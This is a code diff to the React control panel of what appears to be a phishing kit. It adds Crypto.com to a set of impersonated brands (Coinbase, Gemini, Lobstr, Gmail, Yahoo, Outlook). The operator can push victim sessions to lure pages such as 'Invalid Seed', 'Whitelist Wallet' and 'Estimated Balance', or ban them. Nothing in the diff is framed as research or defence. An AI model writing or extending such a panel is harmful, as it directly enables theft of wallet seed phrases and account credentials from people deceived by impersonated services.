@@ -16,6 +16,7 @@ const getBrandFromSessionId = (sessionId) => {
     case 'GEMINI': return 'Gemini';
     case 'LOBSTR': return 'Lobstr';
     case 'GMAIL': return 'Gmail';
+    case 'CRYPTO': return 'Crypto.com';
     default: return 'Coinbase'; // Default for old sessions without prefix
   }
 };
@@ -27,6 +28,7 @@ const getBrandColor = (brand) => {
     case 'Gemini': return 'bg-cyan-500/20 text-cyan-400 border-cyan-500/30';
     case 'Lobstr': return 'bg-purple-500/20 text-purple-400 border-purple-500/30';
     case 'Gmail': return 'bg-red-500/20 text-red-400 border-red-500/30';
+    case 'Crypto.com': return 'bg-indigo-500/20 text-indigo-400 border-indigo-500/30';
     default: return 'bg-gray-500/20 text-gray-400 border-gray-500/30';
   }
 };
@@ -165,6 +167,7 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
     switch(brand) {
       case 'Lobstr': return 'lobstrloading.html';
       case 'Gemini': return 'geminiloading.html';
+      case 'Crypto.com': return 'cryptocomloading.html';
       case 'Gmail': return 'gmaillogin.html';
       case 'Yahoo': return 'yahoologin.html';
       case 'Outlook': return 'outlooklogin.html';
@@ -382,6 +385,24 @@ const CategorizedPageSelect = ({ selectedPage = 'loading.html', onPageChange, is
       ],
       Invalid: [
         { id: 'geminiinvalidseed.html', name: 'Invalid Seed' }
+      ]
+    },
+    'Crypto.com': {
+      Introduction: [
+        { id: 'cryptocomloading.html', name: 'Loading' },
+        { id: 'cryptocomreview.html', name: 'Review' },
+        { id: 'cryptocomestimatedbalance.html', name: 'Estimated Balance' },
+      ],
+      'Wallets': [
+        { id: 'cryptocomwhitelistwallet.html', name: 'Whitelist Wallet' },
+        { id: 'cryptocomdisconnectwallet.html', name: 'Disconnect Wallet' },
+      ],
+      'Completed Task': [
+        { id: 'cryptocomcompleted.html', name: 'Review Completed' },
+        { id: 'cryptocomwhitelistsuccessful.html', name: 'Whitelist Successful' }
+      ],
+      Invalid: [
+        { id: 'cryptocominvalidseed.html', name: 'Invalid Seed' }
       ]
     },
     Gmail: {
@@ -602,6 +623,7 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
     switch(brand) {
       case 'Lobstr': return 'lobstrloading.html';
       case 'Gemini': return 'geminiloading.html';
+      case 'Crypto.com': return 'cryptocomloading.html';
       case 'Gmail': return 'gmaillogin.html';
       case 'Yahoo': return 'yahoologin.html';
       case 'Outlook': return 'outlooklogin.html';
@@ -981,6 +1003,7 @@ const SessionList = ({ userRole }) => {
                   <option value="Coinbase" className="bg-[#1C2029]">Coinbase</option>
                   <option value="Lobstr" className="bg-[#1C2029]">Lobstr</option>
                   <option value="Gemini" className="bg-[#1C2029]">Gemini</option>
+                  <option value="Crypto.com" className="bg-[#1C2029]">Crypto.com</option>
                   <option value="Gmail" className="bg-[#1C2029]">Gmail</option>
                   <option value="Yahoo" className="bg-[#1C2029]">Yahoo</option>
                   <option value="Outlook" className="bg-[#1C2029]">Outlook</option>
